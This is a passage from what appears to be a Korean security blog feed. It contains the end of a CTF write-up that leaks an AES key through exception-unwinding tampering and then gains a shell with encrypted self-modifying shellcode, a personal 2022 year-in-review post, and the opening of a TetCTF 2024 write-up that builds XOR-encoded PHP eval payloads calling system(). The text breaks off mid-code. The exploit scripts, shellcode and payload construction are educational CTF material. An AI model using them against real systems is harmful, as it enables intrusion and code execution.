<p><code>context-&gt;ra</code> 필드는 스택 되감기 과정에서 personality 루틴이 랜딩 패드의 주소를 구하기 위해 참조하는 값입니다. 따라서 이 필드의 값을 적절히 변조하면 원하는 랜딩 패드를 방문할 수 있습니다. 앞서 <code>run</code> 함수는 출력 루틴인 <code>Shellcode</code> 의 소멸자를 호출하는 랜딩 패드를 가지고 있었습니다. <code>context-&gt;ra</code> 필드의 값을 <code>run</code> 함수 내부에서 <code>read_code</code> 함수를 호출하는 <code>run+23</code> 으로 변조하면, personality 루틴은 이를 기준으로 랜딩 패드의 주소를 구합니다. 그 결과 실행 흐름이 옮겨지면 <code>run</code> 함수의 랜딩 패드를 다시 방문하게 됩니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disass run</span><br><span class="line">Dump of assembler code for function run():</span><br><span class="line">   0x000055d6cf1f7610 &lt;+0&gt;:     sub    rsp,0x48</span><br><span class="line">   0x000055d6cf1f7614 &lt;+4&gt;:     mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x000055d6cf1f761d &lt;+13&gt;:    mov    QWORD PTR [rsp+0x40],rax</span><br><span class="line">   0x000055d6cf1f7622 &lt;+18&gt;:    call   0x55d6cf1f7370 &lt;read_code()&gt;</span><br><span class="line">   0x000055d6cf1f7627 &lt;+23&gt;:    mov    QWORD PTR [rsp],rax</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
<p>그런데 변조되는 값은 <code>context-&gt;ra</code> 만이므로, 프레임 자체는 <code>service</code> 함수를 호출하는 <code>launch</code> 함수로 되감아진 상태에서 실행 흐름만 <code>run</code> 함수의 랜딩 패드로 옮겨지게 됩니다. 그리고 <code>launch</code> 함수는 서버에 존재하는 AES 키 값인 <code>secret_key.txt</code> 파일을 읽어 스택 버퍼에 저장하는 함수입니다. 따라서 랜딩 패드에서 <code>Shellcode</code> 구조체의 소멸자는 스택에 선언된 <code>sc.code</code> 라고 생각되는 값을 출력하겠지만, 실제로는 <code>launch</code> 함수의 프레임에 존재하는 AES 키 값이 출력될 것입니다.</p>
<p>바이너리에서 <code>run+23</code> 코드의 오프셋은 <code>0x1627</code> 입니다. ASLR에 의해 하위 12비트를 제외한 주소는 런타임에 랜덤하게 정해지므로, 실제 주소의 하위 2바이트가 <code>0x5627</code> 이라고 가정하면 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mn>16</mn></mrow><annotation encoding="application/x-tex">1/16</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1/16</span></span></span></span></eq>의 확률로 일치하게 됩니다. 따라서 다음과 같이 <code>key</code> 값을 유출하기 위한 코드를 작성할 수 있습니다.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1234</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./trust_code&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r.sendafter(<span class="string">b&quot;iv&gt;&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">24</span> + <span class="string">b&quot;\x27\x56&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;code&gt;&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>셸 스크립트로 무한 루프를 만들어 성공할 때까지 반복 실행하면 다음과 같이 <code>key</code> 값인 <code>&quot;USER_SECRET_KEY!&quot;</code> 가 출력됨을 확인할 수 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ while [ true ]; do ./leak.py; done</span><br><span class="line">[+] Opening connection to localhost on port 1234: Done</span><br><span class="line">...</span><br><span class="line">[+] Opening connection to localhost on port 1234: Done</span><br><span class="line">[DEBUG] Received 0x4 bytes:</span><br><span class="line">    b&#x27;iv&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x1a bytes:</span><br><span class="line">    b&quot;aaaaaaaaaaaaaaaaaaaaaaaa&#x27;V&quot;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    b&#x27;code&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x8 bytes:</span><br><span class="line">    b&#x27;a&#x27; * 0x8</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [DEBUG] Received 0xa5 bytes:</span><br><span class="line">    00000000  0a 3d 20 45  78 65 63 75  74 65 64 20  3d 0a 00 00  │·= E│xecu│ted │=···│</span><br><span class="line">    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 0a 3d  │····│····│····│···=│</span><br><span class="line">    00000030  20 45 78 65  63 75 74 65  64 20 3d 0a  00 1c 01 00  │ Exe│cute│d =·│····│</span><br><span class="line">    00000040  00 00 00 00  79 00 00 00  00 00 00 00  55 53 45 52  │····│y···│····│USER│</span><br><span class="line">    00000050  5f 53 45 43  52 45 54 5f  4b 45 59 21  0a 53 6f 72  │_SEC│RET_│KEY!│·Sor│</span><br><span class="line">    00000060  72 79 20 66  6f 72 20 74  68 65 20 69  6e 63 6f 6e  │ry f│or t│he i│ncon│</span><br><span class="line">    00000070  76 65 6e 69  65 6e 63 65  2c 20 74 68  65 72 65 20  │veni│ence│, th│ere │</span><br><span class="line">    00000080  77 61 73 20  61 20 70 72  6f 62 6c 65  6d 20 77 68  │was │a pr│oble│m wh│</span><br><span class="line">    00000090  69 6c 65 20  64 65 63 72  79 70 74 69  6e 67 20 63  │ile │decr│ypti│ng c│</span><br><span class="line">    000000a0  6f 64 65 2e  0a                                     │ode.│·│</span><br><span class="line">    000000a5</span><br><span class="line"></span><br><span class="line">= Executed =</span><br><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><br><span class="line">= Executed =</span><br><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00SER_SECRET_KEY!</span><br><span class="line">Sorry for the inconvenience, there was a problem while decrypting code.</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>
<p><code>key</code> 값을 유출하였으므로 셸코드를 암호화하여 전송하면 되는데, <code>\x0f</code> 와 <code>\x05</code> 를 사용하면 실패하는 조건이 있습니다. 따라서 <code>syscall</code> 와 <code>sysenter</code> 인스트럭션을 통해 시스템 콜을 호출할 수 없습니다. 그런데 코드가 복사 후 실행되는 영역은 쓰기와 실행이 모두 가능한 rwx 페이지입니다. 그러므로 런타임에 동적으로 셸코드의 내용을 수정하는 코드를 추가하면 <code>syscall</code> 인스트럭션을 실행할 수 있습니다.</p>
<p>사용자가 입력한 코드를 호출하는 부분은 <code>execute+57</code> 입니다. 이 주소에 중단점을 걸고 실행하면 해당 위치에서 <code>rax</code> 레지스터에는 rwx 페이지의 주소, <code>rsi</code> 레지스터에는 <code>0x1000</code> 이 저장되어 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Breakpoint 1, 0x000055f56b7fb589 in execute(unsigned char*) ()</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; pdisass 1</span><br><span class="line"> ► 0x55f56b7fb589    call   qword ptr [rsp + 8]           &lt;0x7fb6a29c7000&gt;</span><br><span class="line"></span><br><span class="line">   0x55f56b7fb58d    mov    rdi, qword ptr [rsp + 8]</span><br><span class="line">   0x55f56b7fb592    mov    esi, 0x1000</span><br><span class="line">pwndbg&gt; i r rax rsi</span><br><span class="line">rax            0x7fb6a29c7000      140422388936704</span><br><span class="line">rsi            0x1000              4096</span><br><span class="line">pwndbg&gt; vmmap $rax</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x7fb6a29c7000     0x7fb6a29c8000 rwxp     1000 0      [anon_7fb6a29c7] +0x0</span><br></pre></td></tr></table></figure>
<p>이들 레지스터의 값을 이용하여 셸코드의 마지막 2바이트에 <code>\x0f\x05</code> 를 대입하는 코드를 추가한 익스플로잇 코드를 다음과 같이 작성합니다. 익스플로잇 코드를 실행하면 셸을 획득할 수 있습니다.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1234</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    sc = <span class="string">b&quot;\x66\x81\xee\xf1\x0a\x66\x89\x70\x1e&quot;</span>    <span class="comment"># sub si,0xaf1 ; mov [rax+30],si</span></span><br><span class="line">    sc += <span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\xff\xff&quot;</span>   <span class="comment"># \xff\xff becomes \x0f\x05</span></span><br><span class="line"></span><br><span class="line">    key = <span class="string">b&quot;USER_SECRET_KEY!&quot;</span></span><br><span class="line">    iv = <span class="string">b&quot;a&quot;</span> * <span class="number">16</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv=iv)</span><br><span class="line">    ct = cipher.encrypt(<span class="string">b&quot;TRUST_CODE_ONLY!&quot;</span> + sc)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">b&quot;iv&gt;&quot;</span>, iv)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;code&gt;&quot;</span>, ct)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./ex.py</span><br><span class="line">[+] Opening connection to localhost on port 1234: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>2022년을 돌아보며</title>
    <url>/2022/12/31/looking-back-on-2022/</url>
    <content><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<p>다섯 가지 주제를 통해 2022년 한 해를 돌아보았습니다.</p>
<h2 id="%EA%B1%B4%EA%B0%95" tabindex="-1">💪 건강</h2>
<p>체력과 근력이 확실히 좋아졌습니다. 2~3km 정도는 적당히 빠른 속도로 기분 좋게 뛸 수 있고, 아직 자주는 아니지만 달리기를 좋아하게 되었습니다. 그리고 상체 전반의 근육 쓰는 법을 익혔고 스스로 목표한 수준의 몸을 만들었습니다. 무엇보다 꾸준히 즐겁게 운동하는 습관이 생긴 것이 가장 뿌듯합니다.</p>
<p>정신건강 부분에서는 스트레스를 덜 받는 법을 배우고 있는 것 같습니다. 특히 나의 관점에서 다른 사람의 행동이나 세상 돌아가는 일을 평가하는 것이 항상 옳지는 않을뿐더러, 불필요한 힘을 낭비하고 스트레스만 일으킨다는 사실을 깨달았습니다. 내년부터는 타인과 외부 환경에 대한 아쉬운 얘기를 줄이는 대신, 나 자신은 매일 조금씩 더 나아지고 있는지 먼저 생각하는 사람이 되려고 합니다.</p>
<h2 id="%EC%A7%84%EB%A1%9C" tabindex="-1">👨‍💻 진로</h2>
<p>현역 입대 자체는 다소 충동적이었지만, 병역 의무를 대부분 해결했습니다. 그러면서도 학기 중에는 늘 해야지 하고 시간을 들이지 못했던 소소한 목표들을 군 복무 중 이루게 되어 행복합니다. 전공 분야에서는 알고리즘을 여러 책으로 공부하면서 정렬, 탐색, 다양한 자료구조와 그래프 개념과 아주 친해졌습니다. 덤으로 <a href="https://solved.ac/profile/juhyun167">solved.ac</a> 플래티넘 티어도 달성했는데, 골드 1티어에서 마지막 문제를 푼 날은 랭크 게임의 승급전을 치르는 것처럼 쫄깃했던 기억이 납니다.</p>
<p>보안 분야에서는 동아리원 한 분과 선의의 경쟁을 하다 보니 드림핵 <a href="https://dreamhack.io/users/891/wargame">랭킹</a>을 7위까지 올렸습니다. 고난도 문제를 연달아 풀다 보니 커널, 브라우저, 최신 웹 취약점을 열심히 공부했고, 새로운 지식과 인사이트를 많이 얻었습니다. 그리고 참 어이없게도 재학 중일 때보다 해킹대회에 더 많이 참가했습니다. 군인 신분으로 CCE 본선에 진출한 경험은 정말 신선했고, 아직도 그날의 분위기가 생생합니다. 약점을 보완해서 반드시 다시 도전하고 싶다는 자극이 되었습니다.</p>
<h2 id="%EA%B2%BD%EC%A0%9C" tabindex="-1">💳 경제</h2>
<p>스스로 사실상 금융 문맹에 가까웠음을 느꼈던 한 해였습니다. 성인으로서 가져야 할 경제와 금융 지식도 부족했고, 소비 습관도 합리적이지는 못했다고 생각합니다. 그래서 늦게나마 경제 지식에 관한 공부를 시작했습니다. 한국은행 경제교육실에서 발간한 <a href="https://www.bok.or.kr/portal/bbs/B0000249/view.do?nttId=10061816&amp;menuNo=200765&amp;pageIndex=1">알기 쉬운 경제이야기</a> 책으로 이제 발걸음을 뗀 단계지만, 재미를 느끼고 있습니다. 이 책이 무료인데도 계속 개정이 되고 있고, 정말 읽기 쉬우면서도 유익해서 놀랐습니다.</p>
<p>당장 느낀 점은 경제 지식이 조금만 생겨도 자본주의 체제인 세상을 보는 관점이 바뀌고, 시야가 넓어진다는 것입니다. 그리고 앞으로의 삶에서 중장기 경제 계획은 필수적이고, 생애 주기별로 필요한 자금을 마련하기 위해서는 반드시 적절한 자산 운용이 필요함을 알게 되었습니다. 곧 전역하면 자취를 시작할 예정입니다. 어떤 것이 합리적인 의사 결정이고 소비인지 배웠으니, 실제로 연습해서 지출 통제를 실천할 좋은 기회라고 생각합니다.</p>
<h2 id="%EB%8F%85%EC%84%9C" tabindex="-1">📚 독서</h2>
<p>군 복무를 하면서 의외로 책 읽는 취미와 습관이 생겼습니다. 통념과는 달리 부대 도서관에는 생각보다 유익하고 다양하면서 최근에 나온 책들이 많았고, 덕분에 시간이 정말 잘 갔습니다. 도서관의 좋은 책들을 거의 다 읽을 때쯤 학교 전자도서관의 존재를 알았는데, 서점의 신간 베스트셀러 서가에 있는 책이 전자책으로 올라와 있는 걸 보고 입이 떡 벌어졌습니다.</p>
<p>대학 입학 후 오랜만에 책을 읽으면서 확실히 스스로 깊이 생각하고 돌아보는 감각이 너무 무디어졌음을 느꼈습니다. 여러 분야를 읽다 보니 뉴스나 인터넷을 통해 알게 된 지식 중 실제로는 사실이 아닌 것들도 많았음을 알게 되었습니다. 예를 들어 스탠퍼드 교도소 실험이나 밀그램의 복종 실험을 다룬 칼럼을 보고 역시 인간의 본성은 악하다고 생각했던 신입생 때가 있었는데, 실제로는 계획된 조작 실험이라는 진술이 많음을 한 저널리스트의 <a href="https://product.kyobobook.co.kr/detail/S000001947556">책</a>을 읽고서야 알았습니다.</p>
<h2 id="%EB%A7%88%EC%9D%8C%EA%B0%80%EC%A7%90" tabindex="-1">💕 마음가짐</h2>
<p>말년에 풀어지는 것을 저 또한 완전히 피해 갈 수 없었습니다. 희한한 것이 군 복무 초반에는 5일 휴가를 나와도 시간이 아까워 학교 동아리방에서 워게임 문제를 풀었는데, 지금은 10일을 나와도 ‘말년이니까~’ 하면서 뒹굴뒹굴하고 있습니다. 그래도 컴퓨터는 지금까지 충분히 했고 나가면 질리도록 할 수 있으니, 운동과 독서 습관만 끝까지 붙들고 나와야겠습니다.</p>
<p>그리고 사람이 너무 그리워졌습니다. 군 복무 전 만났던 친구들, 선배/후배님들, 같이 공부하면서 알게 된 분들과 생긴 크고 작은 인연이 얼마나 소중했는지를 절절히 느끼고 있습니다. 지금까지 관계 유지에 있어 너무 수동적으로 생각했던 것은 아닌지 돌아본 한 해가 되었습니다. 이전처럼 반갑고 익숙하게 만날 수 있었던 사람들이 정말 고마웠고, 그동안 내색을 못 해서 미안했습니다.</p>
<h2 id="%EA%B2%B0%EB%A1%A0" tabindex="-1">결론</h2>
<p>요즈음 내년의 나는 무엇을 하는 사람이 되어야 할지 고민하고 있는데, 처음으로 한 해를 돌아보는 시간을 가지니 어느 정도 테두리가 그려지면서 도움이 많이 되었습니다. 다가오는 내년은 나 자신과 올해 함께한 인연들, 그리고 고마운 분들이 각자 바라는 무언가에 조금씩, 꾸준히 가까워지는 시간이 되기를 기원합니다. 마지막으로 새해 복 많이 받으세요! 🧨</p>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Thoughts</category>
      </categories>
  </entry>
  <entry>
    <title>[TetCTF 2024] Stress Release Service</title>
    <url>/2024/02/03/tet24-stress-release-service/</url>
    <content><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<blockquote>
<p>For a better New Year, we are introducing a service that can help you reduce stress.</p>
</blockquote>
<p><a href="/uploads/tet24-stress-release-service/chall.zip">chall.zip</a></p>
<h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">문제 분석</h2>
<p>웹페이지에 들어가면 입력 창과 버튼이 하나 있습니다. 버튼을 클릭하면 입력한 내용과 개구리가 함께 출력됩니다.</p>
<p><img src="/images/tet24-stress-release-service/1.png" alt="1.png"></p>
<p>소스 코드가 제공된 문제로, 플래그는 <code>secret.php</code> 에 하드코딩되어 있습니다. 상단에 배포한 파일에는 실제 플래그를 적어놓기는 했지만, 대회 환경에서 배포된 파일에는 가짜 플래그가 적혀 있습니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Veryyyyyy Secretttttttttttt !!!!!!!!!!!!!!!!!</span></span><br><span class="line"><span class="variable">$FL4ggggggggggg</span> = <span class="string">&quot;TetCTF&#123;*** redacted ***&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>index.php</code> 를 보면 입력한 내용이 <code>$voice</code> 에 대입됩니다. 이후 <code>validateInput()</code> 함수의 검증을 통과할 경우 <code>eval()</code> 함수의 문자열 인자 중 일부로 전달됩니다. PHP의 <code>eval()</code> 함수는 문자열을 코드로 간주하여 실행하는 함수이기 때문에, 임의 코드 실행이 가능한 상황입니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;shout&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;shout&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_GET</span>[<span class="string">&quot;shout&quot;</span>])) &#123;</span><br><span class="line">	<span class="variable">$voice</span> = <span class="variable">$_GET</span>[<span class="string">&quot;shout&quot;</span>];</span><br><span class="line">	<span class="variable">$res</span> = <span class="string">&quot;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;img src=\&quot;https://i.imgur.com/SvbbT0W.png\&quot; width=5% /&gt; WRONGGGGG WAYYYYYY TOOOO RELEASEEEEE STRESSSSSSSS!!!!!!&lt;/center&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">validateInput</span>(<span class="variable">$voice</span>) === <span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="string">&quot;\$res=&#x27;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;img src=\&quot;https://i.imgur.com/TL6siVW.png\&quot; width=5% /&gt; &quot;</span>.<span class="variable">$voice</span>.<span class="string">&quot;.&lt;/center&gt;&#x27;;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$res</span>) &lt; <span class="number">300</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;Too loud!!! Please respect your neighbor.&lt;/center&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>validateInput()</code> 함수는 입력이 특수문자로만 이루어져 있는지, 사용한 문자의 종류가 7종을 초과하는지 검사합니다. 즉 이 문제는 특수문자 7종 이하만을 사용한 PHP 코드 작성을 요구하고 있습니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validateInput</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// To make your shout effective, it shouldn&#x27;t contain alphabets or numbers.</span></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// and only a few characters. Let&#x27;s make your shout clean.</span></span><br><span class="line">	<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">array_count_values</span>(<span class="title function_ invoke__">str_split</span>(<span class="variable">$input</span>)));</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$count</span> &gt; <span class="number">7</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">문제 풀이</h2>
<p>기존의 특수문자만을 이용한 PHP 코드 실행 문제를 보면 몇 가지 파훼법이 존재합니다. 예를 들어 아래 풀이는 <code>$_</code> 변수에 아무 문자열이나 대입한 후, <code>$_++;</code> 로 원하는 문자가 나올 때까지 증감 연산을 하는 방법을 사용합니다.</p>
<p><div class="link-preview-widget"><a href="https://medium.com/mucomplex/bypass-with-php-non-alpha-encoder-fee4e1bac31e" rel="noopener" target="_blank"><div class="link-preview-widget-title">Bypass with PHP non-alpha encoder</div><div class="link-preview-widget-description">In this tutorial, I will cover PHP non-alpha encoder. I will show some basic concept first before we going deeper which may cause brain…</div><div class="link-preview-widget-url">Medium</div></a><a class="link-preview-widget-image" href="https://medium.com/mucomplex/bypass-with-php-non-alpha-encoder-fee4e1bac31e" rel="noopener" style="background-image: url('https://miro.medium.com/v2/da:true/resize:fit:800/1*iZe04u0aJPryRXy3azmq6w.gif');" target="_blank"></a></div></p>
<p>그런데 이 문제는 PHP 8.3 버전에서 동작하여 위와 같은 방식을 사용할 수 없습니다. 증감 연산자에 대한 PHP <a href="https://www.php.net/manual/en/language.operators.increment.php">문서</a>를 보면 8.3 버전부터 문자열에 대한 증감 연산을 더 이상 지원하지 않습니다.</p>
<p><img src="/images/tet24-stress-release-service/2.png" alt="2.png"></p>
<p>다만 PHP의 논리적 xor 연산자는 문자열 간의 연산을 지원하고 있습니다. <code>php -a</code> 로 인터랙티브 셸을 실행하여 확인할 수도 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt; echo &#x27;(&#x27; ^ &#x27;\\&#x27;;</span><br><span class="line">t</span><br></pre></td></tr></table></figure>
<p>그렇다면 특수문자 7종 간 xor 연산을 계속하여 코드 실행에 필요한 문자를 모두 얻을 수도 있을 것입니다.</p>
<p><code>index.php</code> 코드를 보면 입력은 <code>$res = '...</code> 와 <code>...';</code> 사이에 들어갑니다. 따라서 문자열과 코드를 분리하기 위한 <code>'</code> 와 <code>;</code> 이 필요합니다. 또한 xor과 문자열 덧셈을 위한 <code>^</code> 와 <code>.</code> , xor 연산식을 감싸기 위한 <code>(</code> 와 <code>)</code> 를 선택했습니다. 7종을 채우려면 하나가 남는데, 역슬래시 <code>\\</code> 를 사용했습니다.</p>
<p>각 알파벳을 가장 적은 횟수의 xor 연산으로 얻는 완전 탐색을 실시하면, 선택한 특수문자 중 최대 6종만으로 모든 문자의 조합이 가능함을 확인할 수 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;A&#x27;: [39, 59, 40, 41, 92],</span><br><span class="line"> &#x27;B&#x27;: [39, 94, 59],</span><br><span class="line"> &#x27;C&#x27;: [39, 94, 59, 40, 41],</span><br><span class="line">...</span><br><span class="line"> &#x27;x&#x27;: [39, 94, 40, 41],</span><br><span class="line"> &#x27;y&#x27;: [39, 94],</span><br><span class="line"> &#x27;z&#x27;: [39, 40, 41, 92]&#125;</span><br></pre></td></tr></table></figure>
<p>추가적으로 PHP는 다음과 같이 함수명에 해당하는 문자열을 괄호로 감싸 함수 호출이 가능합니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt; system(&quot;id&quot;);</span><br><span class="line">uid=501(user) gid=1000(user) groups=1000(user)</span><br><span class="line">php &gt;</span><br><span class="line">php &gt; (&quot;system&quot;)(&quot;id&quot;);</span><br><span class="line">uid=501(user) gid=1000(user) groups=1000(user)</span><br></pre></td></tr></table></figure>
<p>따라서 <code>system()</code> 함수를 호출해 임의 커맨드를 실행할 수 있습니다. 아래 코드는 완전 탐색 후 <code>(&quot;system&quot;)(&quot;cat s*&quot;)</code> 를 실행하기 위한 특수문자 문자열을 조합합니다.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">tbl = <span class="built_in">dict</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_table</span>():</span><br><span class="line">    <span class="keyword">global</span> tbl</span><br><span class="line"></span><br><span class="line">    cs = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, [<span class="string">b&quot;&#x27;&quot;</span>, <span class="string">b&quot;^&quot;</span>, <span class="string">b&quot;;&quot;</span>, <span class="string">b&quot;(&quot;</span>, <span class="string">b&quot;)&quot;</span>, <span class="string">b&quot;.&quot;</span>, <span class="string">b&quot;\\&quot;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> it <span class="keyword">in</span> combinations(cs, i):</span><br><span class="line">            c = <span class="built_in">chr</span>(reduce(xor, it))</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">in</span> string.ascii_letters + <span class="string">&quot; *&quot;</span>:</span><br><span class="line">                tbl[c] = <span class="built_in">list</span>(it)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tbl</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rtos</span>(<span class="params">r: <span class="built_in">list</span></span>):</span><br><span class="line">    res = <span class="string">&quot;(&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>, r)):</span><br><span class="line">        res += <span class="string">&quot;&#x27;&quot;</span> + (<span class="string">&quot;\\&quot;</span> <span class="keyword">if</span> c <span class="keyword">in</span> [<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&quot;</span>] <span class="keyword">else</span> <span class="string">&quot;&quot;</span>) + c + <span class="string">&quot;&#x27;^&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res[:-<span class="number">1</span>] + <span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">s</span>):</span><br><span class="line">    res = <span 